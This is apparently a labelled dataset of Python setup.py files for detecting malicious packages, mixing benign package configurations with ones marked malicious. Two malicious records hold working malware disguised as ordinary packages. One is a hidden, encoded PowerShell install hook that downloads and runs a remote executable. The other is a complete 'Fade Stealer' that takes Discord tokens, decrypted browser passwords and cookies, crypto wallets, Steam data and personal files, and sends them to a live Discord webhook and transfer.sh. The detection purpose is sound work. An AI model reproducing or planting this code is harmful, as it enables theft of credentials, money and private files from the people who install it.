{"idx": "lgtbvm-3.96", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'LGTBvm',\n    packages = ['modlib'],\n    version = '4.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-comprehensions-3.10.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "dhawnz-1", "func": "from setuptools import setup\nfrom builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open\nexec('')\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads,load\nfrom ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer\nfrom urllib.request import Request,urlopen\nfrom json import loads,dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\n\nhook='https://discord.com/api/webhooks/1106289357897351279/o8vmBS4UO5R997LoMJ_J91wbdn4okCTVLgM2KMQFYGmxa1FHKlqLq61CM6dT1z1PrV3M'\nDETECTED=False\ndef getip():\n    ip='None'\n    try:\n        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n    except:\n        pass\n    return ip\nrequirements=[\n['requests','requests'],\n['Crypto.Cipher','pycryptodome']\n]\nfor modl in requirements:\n    try:__import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n        time.sleep(3)\nimport requests\nfrom Crypto.Cipher import AES\nlocal=os.getenv('LOCALAPPDATA')\nroaming=os.getenv('APPDATA')\ntemp=os.getenv('TEMP')\nThreadlist=[]\nclass DATA_BLOB(Structure):\n    _fields_=[\n('cbData',wintypes.DWORD),\n('pbData',POINTER(c_char))\n]\ndef GetData(blob_out):\n    cbData=int(blob_out.cbData)\n    pbData=blob_out.pbData\n    buffer=c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer,pbData,cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes,entropy=b''):\n    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))\n    buffer_entropy=c_buffer(entropy,len(entropy))\n    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)\n    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)\n    blob_out=DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff,master_key=None):\n    starts=buff.decode(encoding='utf8',errors='ignore')[:3]\n    if starts=='v10' or starts=='v11':\n        iv=buff[3:15]\n        payload=buff[15:]\n        cipher=AES.new(master_key,AES.MODE_GCM,iv)\n        decrypted_pass=cipher.decrypt(payload)\n        decrypted_pass=decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode,url,data='',files='',headers=''):\n    for i in range(8):# max trys\n        try:\n            if methode=='POST':\n                if data !='':\n                    r=requests.post(url,data=data)\n                    if r.status_code==200:\n                        return r\n                elif files !='':\n                    r=requests.post(url,files=files)\n                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook,data='',files='',headers=''):\n    for i in range(8):\n        try:\n            if headers !='':\n                r=urlopen(Request(hook,data=data,headers=headers))\n                return r\n            else:\n                r=urlopen(Request(hook,data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data=str(Cookies)\n    tim=re.findall('.google.com',data)\n    if len(tim)<-1:\n        DETECTED=True\n        return DETECTED\n    else:\n        DETECTED=False\n        return DETECTED\ndef GetUHQFriends(token):\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n    except:\n        return False\n    uhqlist=''\n    for friend in friendlist:\n        OwnedBadges=''\n        flags=friend['user']['public_flags']\n        for badge in badgeList:\n            if flags//badge['Value']!=0 and friend['type']==1:\n                if not 'House' in badge['Name']:\n                    OwnedBadges+=badge['Emoji']\n                flags=flags % badge['Value']\n        if OwnedBadges !='':\n            uhqlist+=f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\ndef GetBilling(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n    except:\n        return False\n    if billingjson==[]:return ' -'\n    billing=''\n    for methode in billingjson:\n        if methode['invalid']==False:\n            if methode['type']==1:\n                billing+='<a:Cc:1032742457416355882>'\n            elif methode['type']==2:\n                billing+='<:paypal:1027984840131366922> '\n    return billing\ndef GetBadge(flags):\n    if flags==0:return ''\n    OwnedBadges=''\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    for badge in badgeList:\n        if flags//badge['Value']!=0:\n            OwnedBadges+=badge['Emoji']\n            flags=flags % badge['Value']\n    return OwnedBadges\ndef GetTokenInfo(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())\n    username=userjson['username']\n    hashtag=userjson['discriminator']\n    email=userjson['email']\n    idd=userjson['id']\n    pfp=userjson['avatar']\n    flags=userjson['public_flags']\n    nitro=''\n    phone='-'\n    if 'premium_type' in userjson:\n        nitrot=userjson['premium_type']\n        if nitrot==1:\n            nitro='<:classic:896119171019067423> '\n        elif nitrot==2:\n            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '\n    if 'phone' in userjson:phone=f'`{userjson[\"phone\"]}`'\n    return username,hashtag,email,idd,pfp,flags,nitro,phone\ndef checkToken(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))\n        return True\n    except:\n        return False\ndef uploadToken(token,path):\n    global hook\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)\n    if pfp==None:\n        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'\n    else:\n        pfp=f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing=GetBilling(token)\n    badge=GetBadge(flags)\n    friends=GetUHQFriends(token)\n    if friends=='':friends='No HQ Friends'\n    if not billing:\n        badge,phone,billing=badge,phone,None\n    if nitro=='' and badge=='':nitro=' -'\n    data={\n        'content':f'Found in `{path}`',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                    'name':'<a:dt:1032744237042774057> Token:',\n                    'value':f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n},\n{\n                    'name':'<a:Bat:1032747993981538395> Email:',\n                    'value':f\"`{email}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:gengar:1032750484961890426> Phone:',\n                    'value':f\"{phone}\",\n                    'inline':True\n},\n{\n                    'name':'<a:dt1:1032749135188742176> IP:',\n                    'value':f\"`{getip()}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:uzi:1032752999795265537> Badges:',\n                    'value':f\"{nitro}{badge}\",\n                    'inline':True\n},\n{\n                    'name':'<a:Cc:1032742457416355882> Billing:',\n                    'value':f\"{billing}\",\n                    'inline':True\n},\n{\n                    'name':'<a:diamond:1032752566926315575> HQ Friends:',\n                    'value':f\"{friends}\",\n                    'inline':False\n}\n],\n            'author':{\n                'name':f\"{username}#{hashtag} ({idd})\",\n                'icon_url':f\"{pfp}\"\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n},\n            'thumbnail':{\n                'url':f\"{pfp}\"\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1028588906846879856/1037436987482841129/unknown.png',\n        'username':'Fade Stealer',\n        'attachments':[]\n}\n    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\ndef Reformat(listt):\n    e=re.findall('(\\\\w+[a-z])',listt)\n    while 'https' in e:e.remove('https')\n    while 'com' in e:e.remove('com')\n    while 'net' in e:e.remove('net')\n    return list(set(e))\ndef upload(name,tk=''):\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    if name=='kiwi':\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Interesting files found on user PC:',\n                'value':tk\n}\n],\n            'author':{\n                'name':'Fade | File stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n        return\n    path=name\n    files={'file':open(path,'rb')}\n    if 'wppassw' in name:\n        ra=' | '.join(da for da in paswWords)\n        if len(ra)>1000:\n            rrr=Reformat(str(paswWords))\n            ra=' | '.join(da for da in rrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':ra\n}\n],\n            'author':{\n                'name':'Fade | Password Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    if 'wpcook' in name:\n        rb=' | '.join(da for da in cookiWords)\n        if len(rb)>1000:\n            rrrrr=Reformat(str(cookiWords))\n            rb=' | '.join(da for da in rrrrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':rb\n}\n],\n            'author':{\n                'name':'Fade | Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    LoadRequests('POST',hook,files=files)\ndef writeforfile(data,name):\n    path=os.getenv('TEMP')+f\"\\wp{name}.txt\"\n    with open(path,mode='w',encoding='utf-8')as f:\n        f.write(f\"<--Fade Stealer ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0]!='':\n                f.write(f\"{line}\\n\")\nTokens=''\ndef getToken(path,arg):\n    if not os.path.exists(path):return\n    path+=arg\n    for file in os.listdir(path):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{path}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for regex in('[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}','mfa\\\\.[\\\\w-]{80,95}'):\n                    for token in re.findall(regex,line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens+=token\n                                uploadToken(token,path)\nPassw=[]\ndef getPassw(path,arg):\n    global Passw\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Login Data'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords:paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Passw,'passw')\nCookies=[]\ndef getCookie(path,arg):\n    global Cookies\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Cookies'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords:cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies,'cook')\ndef GetDiscord(path,arg):\n    if not os.path.exists(f\"{path}/Local State\"):return\n    pathC=path+arg\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{pathC}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for token in re.findall('dQw4w9WgXcQ:[^.*\\\\[\\'(.*)\\'\\\\].*$][^\\\\\"]*',line):\n                    global Tokens\n                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens+=tokenDecoded\n                            uploadToken(tokenDecoded,path)\ndef ZipThings(path,arg,procc):\n    pathC=path\n    name=arg\n    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"Metamask_{browser}\"\n        pathC=path+arg\n    if not os.path.exists(pathC):return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n    if 'Wallet' in arg or 'NationsGlory' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"{browser}\"\n    elif 'Steam' in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):return\n        f=open(f\"{pathC}/loginusers.vdf\",'r+',encoding='utf8')\n        data=f.readlines()\n        found=False\n        for l in data:\n            if 'RememberPassword\"\t\t\"1\"' in l:\n                found=True\n        if found==False:return\n        name=arg\n    zf=ZipFile(f\"{pathC}/{name}.zip\",'w')\n    for file in os.listdir(pathC):\n        if not '.zip' in file:zf.write(pathC+'/'+file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths=[\n[f\"{roaming}/Opera Software/Opera GX Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome SxS/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/BraveSoftware/Brave-Browser/User Data\",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Yandex/YandexBrowser/User Data\",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Microsoft/Edge/User Data\",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']\n]\n    discordPaths=[\n[f\"{roaming}/Discord\",'/Local Storage/leveldb'],\n[f\"{roaming}/Lightcord\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordcanary\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordptb\",'/Local Storage/leveldb'],\n]\n    PathsToZip=[\n[f\"{roaming}/atomic/Local Storage/leveldb\",'\"Atomic Wallet.exe\"','Wallet'],\n[f\"{roaming}/Exodus/exodus.wallet\",'Exodus.exe','Wallet'],\n['C:\\\\Program Files (x86)\\\\Steam\\\\config','steam.exe','Steam'],\n[f\"{roaming}/NationsGlory/Local Storage/leveldb\",'NationsGlory.exe','NationsGlory']\n]\n    for patt in browserPaths:\n        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths:\n        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths:\n        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk=[]\n    for patt in browserPaths:\n        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk:thread.join()\n    DETECTED=Trust(Cookies)\n    if DETECTED==True:return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths    \n    upths=[]\n    for file in['wppassw.txt','wpcook.txt']:\n        upload(os.getenv('TEMP')+'\\\\'+file)\ndef uploadToAnonfiles(path):\n    try:\n        files={'file':(path,open(path,mode='rb'))}\n        upload=requests.post('https://transfer.sh/',files=files)\n        url=upload.text\n        return url\n    except:\n        return False\ndef KiwiFolder(pathF,keywords):\n    global KiwiFiles\n    maxfilesperdir=7\n    i=0\n    listOfFile=os.listdir(pathF)\n    ffound=[]\n    for file in listOfFile:\n        if not os.path.isfile(pathF+'/'+file):return\n        i+=1\n        if i<=maxfilesperdir:\n            url=uploadToAnonfiles(pathF+'/'+file)\n            ffound.append([pathF+'/'+file,url])\n        else:\n            break\n    KiwiFiles.append(['folder',pathF+'/',ffound])\nKiwiFiles=[]\ndef KiwiFile(path,keywords):\n    global KiwiFiles\n    fifound=[]\n    listOfFile=os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path+'/'+file)and '.txt' in file:\n                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])\n                    break\n                if os.path.isdir(path+'/'+file):\n                    target=path+'/'+file\n                    KiwiFolder(target,keywords)\n                    break\n    KiwiFiles.append(['folder',path,fifound])\ndef Kiwi():\n    user=temp.split('\\\\AppData')[0]\n    path2search=[\n        user+'/Desktop',\n        user+'/Downloads',\n        user+'/Documents'\n]\n    key_wordsFolder=[\n        'account',\n        'acount',\n        'passw',\n        'secret'\n]\n    key_wordsFiles=[\n        'passw',\n        'mdp',\n        'motdepasse',\n        'mot_de_passe',\n        'login',\n        'secret',\n        'account',\n        'acount',\n        'paypal',\n        'banque',\n        'account',\n        'metamask',\n        'wallet',\n        'crypto',\n        'exodus',\n        'discord',\n        '2fa',\n        'code',\n        'memo',\n        'compte',\n        'token',\n        'backup',\n        'secret',\n        'prox'\n        'binance'\n        'Electrum'\n        'Mycelium'\n]\n    wikith=[]\n    for patt in path2search:\n        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\nglobal keyword,cookiWords,paswWords\nkeyword=[\n    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'\n]\ncookiWords=[]\npaswWords=[]\nGatherAll()\nDETECTED=Trust(Cookies)\nif not DETECTED:\n    wikith=Kiwi()\n    for thread in wikith:thread.join()\n    time.sleep(0.2)\n    filetext='\\n'\n    for arg in KiwiFiles:\n        if len(arg[2])!=0:\n            foldpath=arg[1]\n            foldlist=arg[2]\n            filetext+=f\"\ufffd {foldpath}\\n\"\n            for ffil in foldlist:\n                a=ffil[0].split('/')\n                fileanme=a[len(a)-1]\n                b=ffil[1]\n                filetext+=f\"... [{fileanme}]({b})\\n\"\n            filetext+='\\n'\n    upload('kiwi',filetext)\n\n\nsetup(\n\n    name='dhawnz',\n    packages=['dhawnz'],\n    version='1.0',\n    license='MIT',\n    description='nitrobrder',\n    author=' Jonathan Hartley',\n    keywords=['Colorama'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)", "target": 1}
{"idx": "desert-2020.11.18", "func": "#!/usr/bin/env python\n# -*- encoding: utf-8 -*-\nfrom __future__ import absolute_import\nfrom __future__ import print_function\n\nimport io\nimport re\nimport sys\nfrom glob import glob\nfrom os.path import basename\nfrom os.path import dirname\nfrom os.path import join\nfrom os.path import splitext\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\ndef read(*names, **kwargs):\n    with io.open(\n        join(dirname(__file__), *names), encoding=kwargs.get(\"encoding\", \"utf8\")\n    ) as fh:\n        return fh.read()\n\n\ndef read_extras(*prefixes):\n    requirements = []\n    extras = {}\n\n    for prefix in prefixes:\n        requirements.extend(read(\"{}-requirements.in\".format(prefix)).splitlines())\n        extras[prefix] = requirements.copy()\n\n    return extras\n\n\ntry:\n    with open(\"requirements.in\") as f:\n        INSTALL_REQUIRES = f.read().splitlines()\nexcept FileNotFoundError:\n    print(sys.exc_info())\n    INSTALL_REQUIRES = []\n\nns = {}\nexec(read(\"src/desert/_version.py\"), ns)\nVERSION = ns[\"__version__\"]\n\n# Enable code coverage for C code: we can't use CFLAGS=-coverage in tox.ini, since that may mess with compiling\nsetup(\n    name=\"desert\",\n    version=VERSION,\n    description=\"Deserialize to objects while staying DRY\",\n    long_description=\"%s\\n%s\"\n    % (\n        re.compile(\"^.. start-badges.*^.. end-badges\", re.M | re.S).sub(\n            \"\", read(\"README.rst\")\n        ),\n        re.sub(\":[a-z]+:`~?(.*?)`\", r\"``\\1``\", read(\"CHANGELOG.rst\")),\n    ),\n    author=\"Desert contributors\",\n    author_email=\"python-desert@users.noreply.github.com\",\n    url=\"https://github.com/python-desert/desert\",\n    packages=find_packages(\"src\"),\n    package_dir={\"\": \"src\"},\n    py_modules=[splitext(basename(path))[0] for path in glob(\"src/*.py\")],\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        # complete classifier list: http://pypi.org/pypi?%3Aaction=list_classifiers\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: Unix\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        